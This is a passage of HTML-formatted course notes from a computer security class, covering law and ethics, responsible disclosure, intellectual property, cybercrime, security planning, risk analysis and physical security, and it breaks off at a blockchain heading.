&lt;li&gt;&amp;ldquo;Basic&amp;rdquo; and objectively enforceable&lt;/li&gt;
&lt;li&gt;Species with great detail what must be done and what not to do&lt;/li&gt;
&lt;li&gt;Upheld and applied by state-backed justice system&lt;/li&gt;
&lt;li&gt;Not enough:
&lt;ul&gt;
&lt;li&gt;lengthy legislative process does not keep up with technology&lt;/li&gt;
&lt;li&gt;very narrow focus&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://blog.elijahlopez.ca/images/cs-489-security/canada-legislative-proces.webp&#34; alt=&#34;Legislative prccess in Canada&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;non-violations-of-law&#34; &gt;Non-Violations of Law
&lt;span&gt;
    &lt;a href=&#34;#non-violations-of-law&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;mood manipulation study by Facebook in 2012
&lt;ul&gt;
&lt;li&gt;news feed was scweed by facebook scientists&lt;/li&gt;
&lt;li&gt;some people were shown content with more positive words&lt;/li&gt;
&lt;li&gt;others were shown content sadder than average&lt;/li&gt;
&lt;li&gt;Finding 1: more negative → negative status messages&lt;/li&gt;
&lt;li&gt;Finding 2: neutral content → reduction in words produced by person&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook had this in its terms and services&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;what-is-morality&#34; &gt;What is Morality
&lt;span&gt;
    &lt;a href=&#34;#what-is-morality&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;informal framework of values, principles, beliefs, customs, ways of living&lt;/li&gt;
&lt;li&gt;social pressure&lt;/li&gt;
&lt;li&gt;an individual strongly bounded to a moral system may consider questioning the moral system as wrong&lt;/li&gt;
&lt;li&gt;unconscious formation: family, community, culture&lt;/li&gt;
&lt;li&gt;habit without explicit thinking and reasoning process&lt;/li&gt;
&lt;li&gt;rarely a moral authority agreed by every individual&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ethics&#34; &gt;Ethics
&lt;span&gt;
    &lt;a href=&#34;#ethics&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Branch of philosphy that answers &lt;strong&gt;what should I do?&lt;/strong&gt; out of all possibilities&lt;/li&gt;
&lt;li&gt;ethical decision is a conscious
reasoning process based on each individual’s values, principles, and purpose — do something that is good, right, and meaningful&lt;/li&gt;
&lt;li&gt;ethics is the framework to reason about issues that the laws cannot or do not address&lt;/li&gt;
&lt;li&gt;Ethics is the framework to examine a moral system to see whether the principles and rules there make sense&lt;/li&gt;
&lt;li&gt;ethical reflections shape laws and moral systems a society will develop&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;responsible-disclosure&#34; &gt;Responsible DIsclosure
&lt;span&gt;
    &lt;a href=&#34;#responsible-disclosure&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Suppose a vulnerability is found, what should you do?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;coordinated vulnerability disclosure
&lt;ul&gt;
&lt;li&gt;private full disclosure to all responsible parties (e.g., software vendors for most software bugs)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;wait for patch (90 to 120 days)&lt;/li&gt;
&lt;li&gt;public partial disclosure to pressure responsible parties&lt;/li&gt;
&lt;li&gt;public full disclosure in the interests of pontential victims&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;building-ethically&#34; &gt;Building Ethically
&lt;span&gt;
    &lt;a href=&#34;#building-ethically&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Get as many &lt;strong&gt;dissenting&lt;/strong&gt; voices as possible&lt;/li&gt;
&lt;li&gt;Explain how something works, what can go wrong, how can bad actors take advantage of non-experts&lt;/li&gt;
&lt;li&gt;privacy and data protection norms vary accross regions&lt;/li&gt;
&lt;li&gt;consult other experts&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;non-experts&#34; &gt;Non-Experts
&lt;span&gt;
    &lt;a href=&#34;#non-experts&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;does it work as intended?&lt;/li&gt;
&lt;li&gt;who does this effect?&lt;/li&gt;
&lt;li&gt;does data need to be collected?&lt;/li&gt;
&lt;li&gt;tool not working?&lt;/li&gt;
&lt;li&gt;failure modes? abuses?&lt;/li&gt;
&lt;li&gt;who is effected?&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;independent-experts&#34; &gt;Independent Experts
&lt;span&gt;
    &lt;a href=&#34;#independent-experts&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Insitutional review boards (IRB), independent ethics committee (iEC), ethical review boards (ERB), research ethics board (REB).&lt;/p&gt;
&lt;h3 id=&#34;professional-codes&#34; &gt;Professional Codes
&lt;span&gt;
    &lt;a href=&#34;#professional-codes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Association for Computing Machinery (ACM)&lt;/li&gt;
&lt;li&gt;Institute of Electrical and Electronics Engineers (IEEE)&lt;/li&gt;
&lt;li&gt;Canadian Information Processing Society (CIPS)
&lt;ul&gt;
&lt;li&gt;Protect Public Interest and Maintain Integrity&lt;/li&gt;
&lt;li&gt;Demonstrate Competence and Quality of Service&lt;/li&gt;
&lt;li&gt;Maintain Confidential Information and Privacy&lt;/li&gt;
&lt;li&gt;Avoid Conflicts of Interest&lt;/li&gt;
&lt;li&gt;Uphold Responsibility to the IT Professi&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;legal-protections&#34; &gt;Legal Protections
&lt;span&gt;
    &lt;a href=&#34;#legal-protections&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;In contrast to real property, so-called “intellectual property” (IP) differs in important ways:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It is non-depletable&lt;/li&gt;
&lt;li&gt;It is replicable&lt;/li&gt;
&lt;li&gt;It has minimal marginal cost&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Four kinds&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Trade secrets&lt;/li&gt;
&lt;li&gt;Trademarks&lt;/li&gt;
&lt;li&gt;Patents&lt;/li&gt;
&lt;li&gt;Copyright&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;What?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;differnet intangible&lt;/li&gt;
&lt;li&gt;different rights&lt;/li&gt;
&lt;li&gt;different durations&lt;/li&gt;
&lt;li&gt;different registration process&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;trade-secrets&#34; &gt;Trade Secrets
&lt;span&gt;
    &lt;a href=&#34;#trade-secrets&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;people you have to tell are not able to pass it on&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Reverse engineering&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;figuring out how something works or taking it apart to figure out how it works&lt;/li&gt;
&lt;li&gt;trade secret protection is lost&lt;/li&gt;
&lt;li&gt;Kerckhoffs’s principal: do not depend on secrecy for cryptographic security. RC4 was reverse engineered in 1994&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;trademarks&#34; &gt;Trademarks
&lt;span&gt;
    &lt;a href=&#34;#trademarks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;names, brands, logos, domain names&lt;/li&gt;
&lt;li&gt;make a legal filing showing that you are using the name in commerce&lt;/li&gt;
&lt;li&gt;have to be renewed&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;patents&#34; &gt;Patents
&lt;span&gt;
    &lt;a href=&#34;#patents&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;inventions including algorithms
&lt;ul&gt;
&lt;li&gt;Novel&lt;/li&gt;
&lt;li&gt;Useful&lt;/li&gt;
&lt;li&gt;Non-obvious&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;many cryptographic patents&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;copyright&#34; &gt;Copyright
&lt;span&gt;
    &lt;a href=&#34;#copyright&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Protects expressions of ideas but not the ideas themselves&lt;/li&gt;
&lt;li&gt;Life + 50 in Canada, Life + 70 in USA&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cyber-crime&#34; &gt;Cyber Crime
&lt;span&gt;
    &lt;a href=&#34;#cyber-crime&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Bizarre rulings:
&lt;ul&gt;
&lt;li&gt;value of stolen data was the value of the paper it was printed on&lt;/li&gt;
&lt;li&gt;value of stolen manual was equivalent to equipment it was for&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Computer forensics (admissibility)&lt;/li&gt;
&lt;li&gt;Cybercrime treaty
&lt;ul&gt;
&lt;li&gt;computer crime is often international&lt;/li&gt;
&lt;li&gt;The Council of Europe cybercrime treaty
&lt;ul&gt;
&lt;li&gt;&amp;ldquo;making it easier for law enforcement to access telecommunications traffic (including voice, data, and Internet)&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;non-technical-aspects-of-security&#34; &gt;Non-technical Aspects of Security
&lt;span&gt;
    &lt;a href=&#34;#non-technical-aspects-of-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;security-plan&#34; &gt;Security Plan
&lt;span&gt;
    &lt;a href=&#34;#security-plan&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;what security goals&lt;/li&gt;
&lt;li&gt;how are they met?&lt;/li&gt;
&lt;li&gt;how they will stay met&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Seven parts&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Policy: high-level goals and priorities&lt;/li&gt;
&lt;li&gt;Current state: risk analysis, anticipation of new situations&lt;/li&gt;
&lt;li&gt;Requirements: what are the security and privacy needs&lt;/li&gt;
&lt;li&gt;Recommended controls: how to provide those needs&lt;/li&gt;
&lt;li&gt;Accountability: who is responsible for what&lt;/li&gt;
&lt;li&gt;Timetable: when the elements of the plan will be performed&lt;/li&gt;
&lt;li&gt;Continuing attention: how often the plan should be updated&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;developing-the-security-plan&#34; &gt;Developing the Security Plan
&lt;span&gt;
    &lt;a href=&#34;#developing-the-security-plan&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Input from several constituencies&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Upper management / CTO / CIO (setting policy)&lt;/li&gt;
&lt;li&gt;IT (hardware group, sysadmins)&lt;/li&gt;
&lt;li&gt;Systems and application programmers, DB admins&lt;/li&gt;
&lt;li&gt;Data entry personnel&lt;/li&gt;
&lt;li&gt;Physical security personnel&lt;/li&gt;
&lt;li&gt;Representative users&lt;/li&gt;
&lt;li&gt;External consulting / advisory board&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;business-continuity-plan&#34; &gt;Business Continuity Plan
&lt;span&gt;
    &lt;a href=&#34;#business-continuity-plan&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;A way out of availability situations,&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Catastrophic: a large part (or all) of a computing capability is suddenly unavailable&lt;/li&gt;
&lt;li&gt;Long duration: the outage is expected to last for so long that business would suffer if left unattended&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Need redundancy and arrange backups and training employees. What about live testing?&lt;/p&gt;
&lt;h3 id=&#34;risk-analysis&#34; &gt;Risk Analysis
&lt;span&gt;
    &lt;a href=&#34;#risk-analysis&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Identify assets
&lt;ul&gt;
&lt;li&gt;Hardware&lt;/li&gt;
&lt;li&gt;Software&lt;/li&gt;
&lt;li&gt;Data&lt;/li&gt;
&lt;li&gt;Documentation&lt;/li&gt;
&lt;li&gt;Procedures&lt;/li&gt;
&lt;li&gt;Reputation&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Determine vulnerabilities
&lt;ul&gt;
&lt;li&gt;Threat modeling&lt;/li&gt;
&lt;li&gt;Think like an attacker and be very creative, even outlandish&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Estimate likelihood of exploitation
&lt;ul&gt;
&lt;li&gt;acturial science&lt;/li&gt;
&lt;li&gt;what is the chance of a buffer overflow bug with arbitrary code execution? With stack canaries? with ASLR?&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Compute risk exposure
&lt;ul&gt;
&lt;li&gt;legal obligations&lt;/li&gt;
&lt;li&gt;penalities&lt;/li&gt;
&lt;li&gt;harm&lt;/li&gt;
&lt;li&gt;value of keeping it away from competitors&lt;/li&gt;
&lt;li&gt;cost of delaying or out sourcing data processing when systems down&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Survey applicable controls
&lt;ul&gt;
&lt;li&gt;different ways to control vulnerabilities&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Project savings due to control
&lt;ul&gt;
&lt;li&gt;savings = risk exposure - cost of control - new risk exposure&lt;/li&gt;
&lt;li&gt;when savings &amp;gt;= 0, apply control (risk averse); insurance.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;physical-security&#34; &gt;Physical Security
&lt;span&gt;
    &lt;a href=&#34;#physical-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;attacker steals laptop off of desk&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;blockchain&#34; &gt;Blockchain
&lt;span&gt;
    &lt;a href=&#34;#blockchain&#34;&gt;
